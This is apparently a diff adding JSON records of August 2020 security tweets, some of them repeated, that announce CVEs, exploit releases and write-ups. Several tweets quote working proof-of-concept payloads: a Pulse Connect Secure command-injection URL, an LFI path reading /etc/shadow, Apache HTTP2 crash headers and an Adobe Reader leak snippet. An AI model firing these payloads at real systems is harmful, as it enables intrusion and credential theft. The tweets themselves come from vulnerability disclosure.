+    "tweettext": "[CVE-2020-9490] Apache2 HTTP2 Push Diary Memory Corruption\n\nPoC (Not include exploit)\n#case1 conn.request('GET', '/', headers={\"Cache-Digest\": \"EA9BQQ==\"})\n#case2 conn.request('GET', '/', headers={\"Cache-Digest\": \"EA8=\"})\n\nFull Python Script in the Pic.\n\nhttps://t.co/LlztMc222a https://t.co/AGU8i6GAhZ",
+    "tweettime": "2020-08-26, 03:38:52",
+    "tweeturl": "https://twitter.com/wugeej/status/1298464906652475395",
+    "username": "wugeej"
+}
+{
+    "expanded_url": [
+        "https://www.trendmicro.com/en_us/research/20/h/cve-2020-1380-analysis-of-recently-fixed-ie-zero-day.html"
+    ],
+    "tweetfavorites": 181,
+    "tweetquotes": 5,
+    "tweetreplies": 5,
+    "tweetretweets": 82,
+    "tweettext": "My analysis of the recent Internet Explorer zero-day vulnerability, CVE-2020-1380\n\nhttps://t.co/qo21pj0xii",
+    "tweettime": "2020-08-25, 02:59:00",
+    "tweeturl": "https://twitter.com/iamelli0t/status/1298092483407093761",
+    "username": "iamelli0t"
+}
+{
+    "expanded_url": [
+        "https://github.com/klinix5/Windows-Setup-EoP"
+    ],
+    "tweetfavorites": 39,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 23,
+    "tweettext": "CVE-2020-1571 : Windows Setup Elevation of Privileges Bypass 0day\n\nAffected Version:\nWindows 10 1803/1809/1903/1909/2004\n\nhttps://t.co/uH5DBVXEhT",
+    "tweettime": "2020-08-21, 13:23:53",
+    "tweeturl": "https://twitter.com/perito_inf/status/1296800192256147456",
+    "username": "perito_inf"
+}
+{
+    "tweetfavorites": 67,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 22,
+    "tweettext": "Finally,he could rce on windows 2008 successful by CVE-2020-1350.This chain spent him too much time.👍",
+    "tweettime": "2020-08-21, 05:56:26",
+    "tweeturl": "https://twitter.com/hackyzh/status/1296687587873230848",
+    "username": "hackyzh"
+}
+{
+    "tweetfavorites": 287,
+    "tweetquotes": 6,
+    "tweetreplies": 12,
+    "tweetretweets": 108,
+    "tweettext": "#DNS #WindowsServer #CVE #EXPLOIT\nDNS 漏洞 CVE-2020-1350 EXPLOIT 新鲜出炉 确定可以导致蠕虫\n\n关于DNS的研究报告在近期可能会分享\n\n堆风水-&gt;堆喷射-&gt;相关数据结构设置-&gt;(利用堆上数据结构任意地址写||信息泄露)-&gt;覆写全局函数指针-&gt;ShellCode 执行 https://t.co/VNfv2CYyrk",
+    "tweettime": "2020-08-21, 05:22:20",
+    "tweeturl": "https://twitter.com/YanZiShuang/status/1296679004343164928",
+    "username": "YanZiShuang"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2020/08/windows-update-download.html"
+    ],
+    "tweetfavorites": 221,
+    "tweetquotes": 8,
+    "tweetreplies": 5,
+    "tweetretweets": 154,
+    "tweettext": "Microsoft issues emergency out-of-band security updates for Windows 8.1, RT 8.1, and Server 2012 R2 systems to patch two recently disclosed privilege escalation bugs (CVE-2020-1530 &amp; CVE-2020-1537) affecting Remote Access Service (RAS).\n\nRead: https://t.co/17sx3z143T\n\n#infosec",
+    "tweettime": "2020-08-20, 17:08:58",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1296494445769166848",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://blog.hiveminds.es/en/posts/cve-2020-1337_my_two_cents/",
+        "https://blog.hiveminds.es/es/posts/cve-2020-1337_mis_dos_centavos/"
+    ],
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 53,
+    "tweettext": "RT @neosysforensics: New blog and new post :)\n\nCVE-2020-1337: my two cents\nhttps://t.co/YxZOdG5rSA\n\nAlso in spanish\nhttps://t.co/x08zMvkGSK…",
+    "tweettime": "2020-08-19, 13:09:37",
+    "tweeturl": "https://twitter.com/jedisct1/status/1296071824657326081",
+    "username": "jedisct1"
+}
+{
+    "expanded_url": [
+        "https://blog.hiveminds.es/en/posts/cve-2020-1337_my_two_cents/",
+        "https://blog.hiveminds.es/es/posts/cve-2020-1337_mis_dos_centavos/"
+    ],
+    "tweetfavorites": 67,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 53,
+    "tweettext": "New blog and new post :)\n\nCVE-2020-1337: my two cents\nhttps://t.co/YxZOdG5rSA\n\nAlso in spanish\nhttps://t.co/x08zMvkGSK\n\nThx to @h4ng3r and the rest of the crew!",
+    "tweettime": "2020-08-19, 11:26:01",
+    "tweeturl": "https://twitter.com/neosysforensics/status/1296045753610182657",
+    "username": "neosysforensics"
+}
+{
+    "expanded_url": [
+        "https://tinyurl.com/yy5va7py"
+    ],
+    "tweetfavorites": 51,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 37,
+    "tweettext": "[Blog] Windows AppX Deployment Service Local Privilege Escalation (CVE-2020-1488) https://t.co/HfsOdyAtKM",
+    "tweettime": "2020-08-18, 17:30:28",
+    "tweeturl": "https://twitter.com/ihack4falafel/status/1295775079855529984",
+    "username": "ihack4falafel"
+}
+{
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 68,
+    "tweettext": "RT @thezdi: Windows Print Spooler Patch Bypass Re-Enables Persistent Backdoor. @HexKitchen details how the patch for CVE-2020-1048 was easi…",
+    "tweettime": "2020-08-17, 16:33:32",
+    "tweeturl": "https://twitter.com/binitamshah/status/1295398366239535104",
+    "username": "binitamshah"
+}
+{
+    "expanded_url": [
+        "https://github.com/klinix5/Windows-Setup-EoP"
+    ],
+    "tweetfavorites": 137,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 80,
+    "tweettext": "CVE-2020-1571 Windows Setup Elevation of Privileges Bypass 0day  https://t.co/cYoe2PnKZT  #Pentesting #Windows #Vulnerability #CVE #Infosec https://t.co/3H38QKJWA0",
+    "tweettime": "2020-08-15, 16:40:21",
+    "tweeturl": "https://twitter.com/ptracesecurity/status/1294675304871534592",
+    "username": "ptracesecurity"
+}
+{
+    "expanded_url": [
+        "https://cwiki.apache.org/confluence/display/WW/S2-059"
+    ],
+    "tweetfavorites": 237,
+    "tweetquotes": 5,
+    "tweetreplies": 4,
+    "tweetretweets": 102,
+    "tweettext": "Apache Struts RCE: S2-059 / CVE-2019-0230\n\nhttps://t.co/m6z3jqRsj4\n\nForced double OGNL evaluation, when evaluated on raw user input in tag attributes, may lead to remote code execution. https://t.co/6JwZCozTeB",
+    "tweettime": "2020-08-13, 17:41:35",
+    "tweeturl": "https://twitter.com/chybeta/status/1293965938388119553",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://securitylab.github.com/advisories/GHSL-2020-069-apache_ofbiz"
+    ],
+    "tweetfavorites": 114,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 46,
+    "tweettext": "CVE-2020-9496 Apache OFBiz PRE-AUTH RCE \n\nadvisory: https://t.co/rsmAgGmzoa https://t.co/ChaSFoeXO8",
+    "tweettime": "2020-08-13, 10:15:02",
+    "tweeturl": "https://twitter.com/chybeta/status/1293853562489810946",
+    "username": "chybeta"
+}
+{
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 117,
+    "tweettext": "RT @TheHackersNews: Here are technical details for a new Windows Remote Access elevation of privilege #vulnerability (CVE-2020-1530) for wh…",
+    "tweettime": "2020-08-12, 19:35:42",
+    "tweeturl": "https://twitter.com/jedisct1/status/1293632271749087232",
+    "username": "jedisct1"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2020/08/microsoft-software-patches.html"
+    ],
+    "tweetfavorites": 34,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 25,
+    "tweettext": "One of the zero-day vulnerabilities under active attack is a remote code execution bug (CVE-2020-1380) affecting Internet Explorer.\n\nhttps://t.co/JaFIg6obtV\n\nSpotted by @kaspersky experts, unknown threat actors are exploiting this issue as part of 'Operation PowerFall' attacks. https://t.co/ctEVtIdYfI",
+    "tweettime": "2020-08-12, 18:54:56",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1293622012133310464",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://symeonp.github.io/2020/12/08/phonebook-uaf-analysis.html",
+        "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1530"
+    ],
+    "tweetfavorites": 197,
+    "tweetquotes": 5,
+    "tweetreplies": 1,
+    "tweetretweets": 117,
+    "tweettext": "Here are technical details for a new Windows Remote Access elevation of privilege #vulnerability (CVE-2020-1530) for which #Microsoft released a security patch yesterday.\n\nhttps://t.co/QaL3a1DbzC\n\nAdvisory: https://t.co/Nsc5X1cc5m\n\n#PatchTuesday https://t.co/QTQajyZluF",
+    "tweettime": "2020-08-12, 18:03:46",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1293609136605675520",
+    "username": "TheHackersNews"
+}
+{
+    "tweetfavorites": 224,
+    "tweetquotes": 6,
+    "tweetreplies": 1,
+    "tweetretweets": 87,
+    "tweettext": "CVE-2020-9697: Info disclosure in #Adobe Reader. \n\nPoC: \nvar a = app.measureDialog(app);\nconsole.println(\"Escript Base: \" + (Math.abs(a[1]) - 0x0044b43).toString(16)) https://t.co/dpxYcvLnca",
+    "tweettime": "2020-08-12, 15:22:53",
+    "tweeturl": "https://twitter.com/thezdi/status/1293568647043190784",
+    "username": "thezdi"
+}
+{
+    "expanded_url": [
+        "https://support.citrix.com/article/CTX277457"
+    ],
+    "tweetfavorites": 136,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 78,
+    "tweettext": "The advisory for an Unauthenticated Arbitrary File Read vulnerability in Citrix XenMobile (CVE-2020-8209) found by our researcher Andrey Medov is now out! The fixes were released privately 3 weeks ago, so we hope a lot of companies are protected now 🙂 https://t.co/iWT0CBneTu https://t.co/NpIyV6gzga",
+    "tweettime": "2020-08-12, 14:07:00",
+    "tweeturl": "https://twitter.com/ptswarm/status/1293549550066642946",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "https://symeonp.github.io/2020/12/08/phonebook-uaf-analysis.html"
+    ],
+    "tweetfavorites": 341,
+    "tweetquotes": 4,
+    "tweetreplies": 6,
+    "tweetretweets": 153,
+    "tweettext": "Yesterday's Patch Tuesday included a PhoneBook use-after-free vulnerability (CVE-2020-1530) I reported. I decided to do a step-by-step write up on how I discovered it. It covers some basic sample gathering, harnessing, fuzzing, analysis and exploitation https://t.co/Uvyvy8CqX1",
+    "tweettime": "2020-08-12, 12:56:28",
+    "tweeturl": "https://twitter.com/symeonp/status/1293531800325754891",
+    "username": "symeonp"
+}
+{
+    "expanded_url": [
+        "https://www.redtimmy.com/java-hacking/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/"
+    ],
+    "tweetfavorites": 89,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 58,
+    "tweettext": "Apache Tomcat RCE by deserialization (CVE-2020-9484) – write-up and exploit  https://t.co/PRJBBTvpRL  #Apache #Java #RCE #Explot #CyberSecurity #Infosec https://t.co/eIK7DCWHAe",
+    "tweettime": "2020-08-12, 04:47:51",
+    "tweeturl": "https://twitter.com/ptracesecurity/status/1293408837060501505",
+    "username": "ptracesecurity"
+}
+{
+    "expanded_url": [
+        "https://go.usa.gov/xfArr"
+    ],
+    "tweetfavorites": 94,
+    "tweetquotes": 11,
+    "tweetreplies": 0,
+    "tweetretweets": 113,
+    "tweettext": "Microsoft’s #PatchTuesday updates include patches for two vulnerabilities—CVE-2020-1380 and CVE-2020-1464—being actively exploited. Update ASAP to protect your systems. https://t.co/FEPH4f2y7S #Cyber #Cybersecurity #InfoSec",
+    "tweettime": "2020-08-11, 19:06:37",
+    "tweeturl": "https://twitter.com/USCERT_gov/status/1293262564529508352",
+    "username": "USCERT_gov"
+}
+{
+    "expanded_url": [
+        "https://bit.ly/33Qh3go"
+    ],
+    "tweetfavorites": 118,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 68,
+    "tweettext": "Windows Print Spooler Patch Bypass Re-Enables Persistent Backdoor. @HexKitchen details how the patch for CVE-2020-1048 was easily bypassed and looks at the new patch released today to fix it. https://t.co/ayeIQC0CQV",
+    "tweettime": "2020-08-11, 18:14:56",
+    "tweeturl": "https://twitter.com/thezdi/status/1293249558768746496",
+    "username": "thezdi"
+}
+{
+    "expanded_url": [
+        "https://github.com/math1as/CVE-2020-1337-exploit"
+    ],
+    "tweetfavorites": 224,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 99,
+    "tweettext": "Oh it's patch tuesday.\nI'm happy to release the exploit of CVE-2020-1337 , this year's leet CVE-ID. also known as windows print spooler privilege escalation bug.\nthanks @md5_salt for the great idea.\nhttps://t.co/GxtUqoSMQM",
+    "tweettime": "2020-08-11, 17:18:16",
+    "tweeturl": "https://twitter.com/Ma7h1as/status/1293235295337381889",
+    "username": "Ma7h1as"
+}
+{
+    "expanded_url": [
+        "https://www.redtimmy.com/java-hacking/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/"
+    ],
+    "tweetfavorites": 67,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 23,
+    "tweettext": "Apache Tomcat RCE by deserialization (CVE-2020-9484) – write-up and exploit\n\nhttps://t.co/lmFgh6v6Gu",
+    "tweettime": "2020-08-11, 15:35:30",
+    "tweeturl": "https://twitter.com/FlatL1ne/status/1293209434345426945",
+    "username": "FlatL1ne"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2020/08/vBulletin-vulnerability-exploit.html"
+    ],
+    "tweetfavorites": 68,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 54,
+    "tweettext": "🔥 Watch Out! A new critical #vBulletin zero-day RCE #vulnerability and its PoC exploits have been publicly disclosed, allowing attackers to bypass patch for an old RCE bug (CVE-2019-16759) and remotely compromise sites.\n\nDetails — https://t.co/961xiq1BqC\n\n#infosec #cybersecurity",
+    "tweettime": "2020-08-11, 13:48:53",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1293182603751694336",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://honoki.net/2020/08/10/cve-2020-11518-how-i-bruteforced-my-way-into-your-active-directory/"
+    ],
+    "tweetfavorites": 1061,
+    "tweetquotes": 17,
+    "tweetreplies": 24,
+    "tweetretweets": 423,
+    "tweettext": "I'm celebrating my first CVE with a writeup! Hope you enjoy it.  🤓\n\n\"CVE-2020-11518: how I bruteforced my way into your Active Directory\"\n\nhttps://t.co/aHKeF7Q3lE\n\n#bugbounty #writeup #blogpost #blog https://t.co/aiweywp3ne",
+    "tweettime": "2020-08-10, 18:04:07",
+    "tweeturl": "https://twitter.com/honoki/status/1292884449110249474",
+    "username": "honoki"
+}
+{
+    "expanded_url": [
+        "https://www.bleepingcomputer.com/news/security/fbi-iranian-hackers-trying-to-exploit-critical-f5-big-ip-flaw/"
+    ],
+    "tweetfavorites": 95,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 49,
+    "tweettext": "The FBI warns of Iranian hackers actively attempting to exploit vulnerable F5 Big-IP ADC devices unpatched against the CVE-2020-5902 unauthenticated remote code execution flaw - @serghei\nhttps://t.co/rcwTyZnqE6",
+    "tweettime": "2020-08-08, 09:00:12",
+    "tweeturl": "https://twitter.com/BleepinComputer/status/1292022789059248128",
+    "username": "BleepinComputer"
+}
+{
+    "expanded_url": [
+        "https://github.com/lucxssouza/CVE-2020-13886"
+    ],
+    "tweetfavorites": 97,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 40,
+    "tweettext": "CVE-2020-13886 0day INTELBRAS TELEFONE IP TIP200/200 LITE &amp; TIP 300 - Local File Include\n\n[ Proof Of Concept ]\nURL parameter -&gt;http://HOST/cgi-bin/cgiServer.exx?page=\n\nLFI payload -&gt; ../../../../etc/shadow\n\nhttps://t.co/fQEOI2WZsF https://t.co/ixlAj26tAM",
+    "tweettime": "2020-08-06, 01:28:21",
+    "tweeturl": "https://twitter.com/wugeej/status/1291184302672158720",
+    "username": "wugeej"
+}
+{
+    "expanded_url": [
+        "https://behindthebreach.com/l/46"
+    ],
+    "tweetfavorites": 119,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 64,
+    "tweettext": "Apache Tomcat RCE by deserialization (CVE-2020-9484) - write-up and exploit https://t.co/YygbwhoXTd #vulnerability #collection #execution #cve_2020_9484 #apache #tomcat",
+    "tweettime": "2020-08-05, 04:00:07",
+    "tweeturl": "https://twitter.com/behindthebreach/status/1290860109053284353",
+    "username": "behindthebreach"
+}
+{
+    "tweetfavorites": 105,
+    "tweetquotes": 1,
+    "tweetreplies": 3,
+    "tweetretweets": 29,
+    "tweettext": "I have just finished the recent IBM Websphere RCE PoC (CVE-2020-4450). It's a nice chain and after all I have learnt many things! https://t.co/JWRiiy7MEM",
+    "tweettime": "2020-08-04, 16:34:24",
+    "tweeturl": "https://twitter.com/peterjson/status/1290687541188767745",
+    "username": "peterjson"
+}
+{
+    "expanded_url": [
+        "https://swarm.ptsecurity.com/openfire-admin-console/"
+    ],
+    "tweetfavorites": 254,
+    "tweetquotes": 4,
+    "tweetreplies": 3,
+    "tweetretweets": 112,
+    "tweettext": "OpenFire allows to get Arbitrary File Read and Unauthenticated Full Read SSRF via its 9090/http and 9091/https ports. The details are in the article by Alexandr Shvetsov (CVE-2019-18393 &amp; CVE-2019-18394): https://t.co/8LTBkwxQaL https://t.co/gpUx8Bos9i",
+    "tweettime": "2020-08-04, 14:46:04",
+    "tweeturl": "https://twitter.com/ptswarm/status/1290660280372994054",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "https://blog.vincss.net/2020/06/cve49-microsoft-windows-lnk-remote-code-execution-vuln-cve-2020-1299-eng.html"
+    ],
+    "tweetfavorites": 68,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 37,
+    "tweettext": "[CVE49] Microsoft Windows LNK Remote Code Execution Vulnerability - CVE-2020-1299  https://t.co/R1oLe81oUw  #Windows #Vulnerability #RCE #CVE #LNK #Infosec https://t.co/DTeuz9GZip",
+    "tweettime": "2020-08-01, 23:32:06",
+    "tweeturl": "https://twitter.com/ptracesecurity/status/1289705496266641408",
+    "username": "ptracesecurity"
+}
+{
+    "expanded_url": [
+        "https://www.gosecure.net/blog/2020/08/26/forget-your-perimeter-rce-in-pulse-connect-secure/"
+    ],
+    "tweetfavorites": 147,
+    "tweetquotes": 3,
+    "tweetreplies": 3,
+    "tweetretweets": 77,
+    "tweettext": "RCE in Pulse Connect Secure RCE (CVE-2020-8218) &lt; v9.1R8\n\nPOC:\nhttps://x.x.x.x/dana-admin/license/downloadlicenses.cgi?cmd=download&amp;txtVLSAuthCode=whatever%20-n%20%27($x=%22ls%20/%22,system$x)%3b%20%23%27%20-e%20/data/runtime/tmp/tt/setcookie.thtml.ttc\n https://t.co/u56yPrxO6R",
+    "tweettime": "2020-08-31, 01:33:29",
+    "tweeturl": "https://twitter.com/jas502n/status/1300245292508307456",
+    "username": "jas502n"
+}
+{
+    "expanded_url": [
+        "https://github.com//withdk//pulse-gosecure-rce-poc"
+    ],
+    "tweetfavorites": 90,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 32,
+    "tweettext": "Proof of concept tool to test for the existence of Pulse Secure RCE (CVE-2020-8218) https://t.co/wYv8IzMoFA",
+    "tweettime": "2020-08-30, 06:57:24",
+    "tweeturl": "https://twitter.com/Dinosn/status/1299964418256707586",
+    "username": "Dinosn"
+}
+{
+    "expanded_url": [
+        "https://www.gosecure.net/blog/2020/08/26/forget-your-perimeter-rce-in-pulse-connect-secure/"
+    ],
+    "tweetfavorites": 319,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 142,
+    "tweettext": "CVE-2020-8218 : Pulse Secure SSL-VPN post-auth RCE\nCc @chybeta\n\nhxxps://x.x.x.x/dana-admin/license/downloadlicenses.cgi?cmd=download&amp;txtVLSAuthCode=whatever -n '($x=\"ls /\",system$x); #' -e /data/runtime/tmp/tt/setcookie.thtml.ttc\n\nhttps://t.co/okL58FZVJU https://t.co/OGxySMF4SM",
+    "tweettime": "2020-08-29, 10:30:52",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1299655751758221319",
+    "username": "cyber_advising"
+}
+{
+    "expanded_url": [
+        "https://www.gosecure.net/blog/2020/08/26/forget-your-perimeter-rce-in-pulse-connect-secure/"
+    ],
+    "tweetfavorites": 367,
+    "tweetquotes": 6,
+    "tweetreplies": 1,
+    "tweetretweets": 187,
+    "tweettext": "CVE-2020-8218 Pulse Connect Secure post-auth RCE\n\nhttps://x.x.x.x/dana-admin/license/downloadlicenses.cgi?cmd=download&amp;txtVLSAuthCode=whatever -n '($x=\"ls /\",system$x); #' -e /data/runtime/tmp/tt/setcookie.thtml.ttc\n\nhttps://t.co/4HZaKORE6s",
+    "tweettime": "2020-08-28, 05:34:56",
+    "tweeturl": "https://twitter.com/chybeta/status/1299218892657586176",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://github.com/maxpl0it/CVE-2019-17026-Exploit/"
+    ],
+    "tweetfavorites": 318,
+    "tweetquotes": 5,
+    "tweetreplies": 1,
+    "tweetretweets": 130,
+    "tweettext": "Published my exploit for CVE-2019-17026 (Firefox JIT bug):\n\nhttps://t.co/YeFsnSVYDv\n\nNo sandbox escape included but if anybody wants a challenge, chain it with CVE-2020-0674 for a neat sandbox escape on Windows!",
+    "tweettime": "2020-08-27, 19:35:33",
+    "tweeturl": "https://twitter.com/maxpl0it/status/1299068051044921347",
+    "username": "maxpl0it"
+}
+{
+    "expanded_url": [
+        "https://swarm.ptsecurity.com/grafana-6-4-3-arbitrary-file-read/"
+    ],
+    "tweetfavorites": 289,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 118,
+    "tweettext": "We are releasing an article about an Authenticated Arbitrary File Read vulnerability (CVE-2019-19499) in Grafana! Dive into Go SQL client libraries, quirks of the MySQL protocol, and more! https://t.co/s5ddu1w7GM",
+    "tweettime": "2020-08-27, 15:11:18",
+    "tweeturl": "https://twitter.com/ptswarm/status/1299001548320600064",
+    "username": "ptswarm"
+}
+{
+    "tweetfavorites": 375,
+    "tweetquotes": 5,
+    "tweetreplies": 2,
+    "tweetretweets": 150,
+    "tweettext": "If you ever come across an old Apache Solr instance vulnerable to CVE-2017-12629 but are unable to get the XXE working, here's another way to achieve RCE via SSRF in the shards parameter. (Using some @hackvertor syntax for legibility.) https://t.co/WirrolkeIo",
+    "tweettime": "2020-08-26, 14:59:59",
+    "tweeturl": "https://twitter.com/honoki/status/1298636315613974532",
+    "username": "honoki"
+}
+{
+    "expanded_url": [
+        "https://www.trendmicro.com/en_us/research/20/h/cve-2020-1380-analysis-of-recently-fixed-ie-zero-day.html"
+    ],
+    "tweetfavorites": 33,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 23,
+    "tweettext": "CVE-2020-1380: Analysis of Recently Fixed IE Zero-Day  https://t.co/FKZYgry3BN  #Pentesting #Exploit #Vulnerabilities #CyberSecurity #Infosec https://t.co/Rpc1sNTdzk",
+    "tweettime": "2020-08-26, 09:58:41",
+    "tweeturl": "https://twitter.com/ptracesecurity/status/1298560490197716992",
+    "username": "ptracesecurity"
+}
+{
+    "expanded_url": [
+        "https://bugs.chromium.org/p/project-zero/issues/detail?id=2030&q=apache&can=1"
+    ],
+    "tweetfavorites": 97,
+    "tweetquotes": 1,
+    "tweetreplies": 6,
+    "tweetretweets": 37,
+    "tweettext": "[CVE-2020-9490] Apache2 HTTP2 Push Diary Memory Corruption\n\nPoC (Not include exploit)\n#case1 conn.request('GET', '/', headers={\"Cache-Digest\": \"EA9BQQ==\"})\n#case2 conn.request('GET', '/', headers={\"Cache-Digest\": \"EA8=\"})\n\nFull Python Script in the Pic.\n\nhttps://t.co/LlztMc222a https://t.co/AGU8i6GAhZ",
+    "tweettime": "2020-08-26, 03:38:52",
+    "tweeturl": "https://twitter.com/wugeej/status/1298464906652475395",
+    "username": "wugeej"
+}
+{
+    "expanded_url": [
+        "https://www.trendmicro.com/en_us/research/20/h/cve-2020-1380-analysis-of-recently-fixed-ie-zero-day.html"
+    ],
+    "tweetfavorites": 181,
+    "tweetquotes": 5,
+    "tweetreplies": 5,
+    "tweetretweets": 82,
+    "tweettext": "My analysis of the recent Internet Explorer zero-day vulnerability, CVE-2020-1380\n\nhttps://t.co/qo21pj0xii",
+    "tweettime": "2020-08-25, 02:59:00",
+    "tweeturl": "https://twitter.com/iamelli0t/status/1298092483407093761",
+    "username": "iamelli0t"
+}
+{
+    "expanded_url": [
+        "https://github.com/klinix5/Windows-Setup-EoP"
+    ],
+    "tweetfavorites": 39,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 23,
+    "tweettext": "CVE-2020-1571 : Windows Setup Elevation of Privileges Bypass 0day\n\nAffected Version:\nWindows 10 1803/1809/1903/1909/2004\n\nhttps://t.co/uH5DBVXEhT",
+    "tweettime": "2020-08-21, 13:23:53",
+    "tweeturl": "https://twitter.com/perito_inf/status/1296800192256147456",
+    "username": "perito_inf"
+}
+{
+    "tweetfavorites": 67,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 22,
+    "tweettext": "Finally,he could rce on windows 2008 successful by CVE-2020-1350.This chain spent him too much time.👍",
+    "tweettime": "2020-08-21, 05:56:26",
+    "tweeturl": "https://twitter.com/hackyzh/status/1296687587873230848",
+    "username": "hackyzh"
+}
+{
+    "tweetfavorites": 287,
+    "tweetquotes": 6,
+    "tweetreplies": 12,
+    "tweetretweets": 108,
+    "tweettext": "#DNS #WindowsServer #CVE #EXPLOIT\nDNS 漏洞 CVE-2020-1350 EXPLOIT 新鲜出炉 确定可以导致蠕虫\n\n关于DNS的研究报告在近期可能会分享\n\n堆风水-&gt;堆喷射-&gt;相关数据结构设置-&gt;(利用堆上数据结构任意地址写||信息泄露)-&gt;覆写全局函数指针-&gt;ShellCode 执行 https://t.co/VNfv2CYyrk",
+    "tweettime": "2020-08-21, 05:22:20",
+    "tweeturl": "https://twitter.com/YanZiShuang/status/1296679004343164928",
+    "username": "YanZiShuang"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2020/08/windows-update-download.html"
+    ],
+    "tweetfavorites": 221,
+    "tweetquotes": 8,
+    "tweetreplies": 5,
+    "tweetretweets": 154,
+    "tweettext": "Microsoft issues emergency out-of-band security updates for Windows 8.1, RT 8.1, and Server 2012 R2 systems to patch two recently disclosed privilege escalation bugs (CVE-2020-1530 &amp; CVE-2020-1537) affecting Remote Access Service (RAS).\n\nRead: https://t.co/17sx3z143T\n\n#infosec",
+    "tweettime": "2020-08-20, 17:08:58",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1296494445769166848",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://blog.hiveminds.es/en/posts/cve-2020-1337_my_two_cents/",
+        "https://blog.hiveminds.es/es/posts/cve-2020-1337_mis_dos_centavos/"
+    ],
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 53,
+    "tweettext": "RT @neosysforensics: New blog and new post :)\n\nCVE-2020-1337: my two cents\nhttps://t.co/YxZOdG5rSA\n\nAlso in spanish\nhttps://t.co/x08zMvkGSK…",
+    "tweettime": "2020-08-19, 13:09:37",
+    "tweeturl": "https://twitter.com/jedisct1/status/1296071824657326081",
+    "username": "jedisct1"
+}
+{
+    "expanded_url": [
+        "https://blog.hiveminds.es/en/posts/cve-2020-1337_my_two_cents/",
+        "https://blog.hiveminds.es/es/posts/cve-2020-1337_mis_dos_centavos/"
+    ],
+    "tweetfavorites": 67,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 53,
+    "tweettext": "New blog and new post :)\n\nCVE-2020-1337: my two cents\nhttps://t.co/YxZOdG5rSA\n\nAlso in spanish\nhttps://t.co/x08zMvkGSK\n\nThx to @h4ng3r and the rest of the crew!",
+    "tweettime": "2020-08-19, 11:26:01",
+    "tweeturl": "https://twitter.com/neosysforensics/status/1296045753610182657",
+    "username": "neosysforensics"
+}
+{
+    "expanded_url": [
+        "https://tinyurl.com/yy5va7py"
+    ],
+    "tweetfavorites": 51,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 37,
+    "tweettext": "[Blog] Windows AppX Deployment Service Local Privilege Escalation (CVE-2020-1488) https://t.co/HfsOdyAtKM",
+    "tweettime": "2020-08-18, 17:30:28",
+    "tweeturl": "https://twitter.com/ihack4falafel/status/1295775079855529984",
+    "username": "ihack4falafel"
+}
+{
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 68,
+    "tweettext": "RT @thezdi: Windows Print Spooler Patch Bypass Re-Enables Persistent Backdoor. @HexKitchen details how the patch for CVE-2020-1048 was easi…",
+    "tweettime": "2020-08-17, 16:33:32",
+    "tweeturl": "https://twitter.com/binitamshah/status/1295398366239535104",
+    "username": "binitamshah"
+}
+{
+    "expanded_url": [
+        "https://github.com/klinix5/Windows-Setup-EoP"
+    ],
+    "tweetfavorites": 137,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 80,
